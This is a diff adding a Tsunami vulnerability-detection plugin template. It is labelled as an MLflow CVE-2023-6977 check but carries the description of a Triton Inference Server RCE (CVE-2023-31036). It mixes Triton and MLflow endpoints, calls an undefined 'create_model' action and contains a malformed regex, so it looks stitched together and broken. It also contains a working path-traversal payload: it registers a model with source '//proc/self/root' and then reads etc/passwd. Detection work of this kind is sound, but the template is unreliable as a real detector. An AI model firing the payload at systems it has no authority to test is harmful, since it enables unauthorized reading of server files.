@@ -1,0 +1,160 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MLFlow_CVE_2023_6977"
+  author: "hh-hunter, frkngksl"
+  version: "0.3"
+}
+
+# original finding ID was "TritonInferenceServerRce", changed since there is a CVE
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2023_31036"
+  }
+  severity: CRITICAL
+  title: "Triton Inference Server Unauthenticated RCE (CVE-2023-31036)"
+  description:
+    "This detector checks triton inference server RCE with explicit model-control"
+    " option enabled. \n"
+    "All versions of triton inference server with the `--model-control"
+    " explicit` option allows for loaded models to be overwritten by "
+    " malicious models and lead to RCE."
+  recommendation: "don't use `--model-control explicit` option with public access"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-31036"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "get_existing_model"
+  http_request: {
+    method: POST
+    uri: "/v2/repository/index"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"name\":\"[^\"]\""
+            variable_name: "MODEL_NAME"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "unload_model"
+  http_request: {
+    method: POST
+    uri: "/v2/repository/models/{{ MODEL_NAME }}/unload"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "load_model"
+  http_request: {
+    method: POST
+    uri: "/v2/repository/models/{{ MODEL_NAME }}/load"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ model_name }}\"}"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"name\":\"[^\"]\""
+            variable_name: "MODEL_NAME"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "update_model"
+  http_request: {
+    method: POST
+    uri: "/ajax-api/2.0/mlflow/model-versions/create"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ model_name }}\",\"source\":\"//proc/self/root\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ model_name }}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "read_file"
+  http_request: {
+    method: GET
+    uri: "/model-versions/get-artifact?path=etc/passwd&name={{ model_name }}&version=1"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "root:x:0:0:root" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "clean_model"
+  http_request: {
+    method: DELETE
+    uri: "/ajax-api/2.0/mlflow/registered-models/delete"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ model_name }}\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "model_name" value: "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}" }
+  ]
+  actions: [
+    "create_model",
+    "update_model",
+    "read_file"
+  ]
+}
